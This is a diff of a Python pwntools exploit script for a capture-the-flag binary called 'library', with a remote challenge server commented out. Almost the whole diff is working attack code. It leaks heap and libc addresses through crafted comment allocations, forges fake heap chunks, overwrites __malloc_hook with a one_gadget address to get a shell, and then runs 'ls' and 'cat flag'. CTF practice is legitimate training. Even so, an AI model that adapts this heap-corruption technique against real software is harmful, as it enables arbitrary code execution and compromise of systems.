@@ -200,52 +200,77 @@ def leak_libc(p: process, heap_leak: int):
     heap_start = book_addr & 0xffff_ffff_ffff_f000
 
     del_comment(p, book_id, 0)
-    book_id = create_comment(p, 0x60, b"b" * 0x10 + p64(0) + p64(((heap_leak - 0x10) - (book_addr + 0x30)) | 1) + p64(0) * 4 + p64(book_addr + 0x40), 0)
 
+    big_chk = b"b" * 0x10 + p64(0) + p64(((heap_leak - 0x10) - (book_addr + 0x30)) | 1) + p64(0) * 4 + p64(book_addr + 0x40)
+
+    print("len: ", hex(len(big_chk)))
+    book_id = create_comment(p, 0x60, big_chk, 0)
+    create_comment(p, 0x500, book=3, need_id=False)
     del_comment(p, 0)
+
     p.sendlineafter("Your choice: ", "1")
     data = p.recvline()[:-1].split(b' ')[-1]
     p.sendline("5")
 
     libc = int.from_bytes(data, 'little') - 0x1ecbe0
     print("libc: ", hex(libc))
-    return libc
+    return libc, book_addr
 
 def main():
-    global p
-    ### run ###
-    p = process("./library")
-    #p = remote("pwnable.co.il", 9010)
+    try:
+        global p
+        ### run ###
+        p = process("./library")
+        #p = remote("pwnable.co.il", 9010)
 
-    ### setup ###
-    register(p, "user", "12345")
-    register(p, "user1", "12345")
-    login(p)
+        ### setup ###
+        register(p, "user", "12345")
+        register(p, "user1", "12345")
+        login(p)
 
-    ### init ###
-    arb_chks_init(p)
+        ### init ###
+        arb_chks_init(p)
 
-    ### leaks ###
-    heap_leak = leak_heap(p)
-    if heap_leak == 0:
+        ### leaks ###
+        heap_leak = leak_heap(p)
+        if heap_leak == 0:
+            p.close()
+            main()
+
+        libc_leak, book_addr = leak_libc(p, heap_leak)
+        if libc_leak == 0:
+            p.close()
+            main()
+
+        ### payload start ###
+        fake_chk = p64(book_addr + 0x80) + p64(0) * 2 + p64(0x71) + p64(book_addr + 0xb0) + p64(0) * 4 + p64(0x71) + p64(0) + p64(0x1337) + b'\x00' * 0x28 + p64(0x71) + p64(0) * 5 + p64(0x71)
+        create_comment(p, 0x500, fake_chk, 3, need_id=False)
+
+        del_comment(p, 0x1337, 0)
+        del_comment(p, 0, 0)
+        
+        malloc_hook_fake_chk = libc_leak + 0x1ecb3d
+
+        create_comment(p, 0x60, p64(0) + p64(0x71) + p64(malloc_hook_fake_chk), need_id=False)
+        create_comment(p, 0x60, need_id=False)
+
+        #overwrite malloc_hook
+        create_comment(p, 0x60, b'a' * 3 + p64(libc_leak + 0xe3b01))
+
+        borrow_book(p, 0)
+        p.sendline("2")
+        p.sendline("Y")
+        p.sendline("30")
+        p.sendline("ls")
+        p.sendline("cat flag")
+        p.interactive() 
+    except:
         p.close()
         main()
-
-    heap_start = (heap_leak - 0x7000) & 0xffff_ffff_ffff_f000
-    print("heap: ", hex(heap_start))
-
-    libc_leak = leak_libc(p, heap_leak)
-    if libc_leak == 0:
-        p.close()
-        main()
-
-    ### payload start ###
-    p.interactive() 
 
 if __name__ == "__main__":
     try:
         main()
-    except Exception as e:
-        print("Error: ", e)
+    except:
         p.close()
         main()
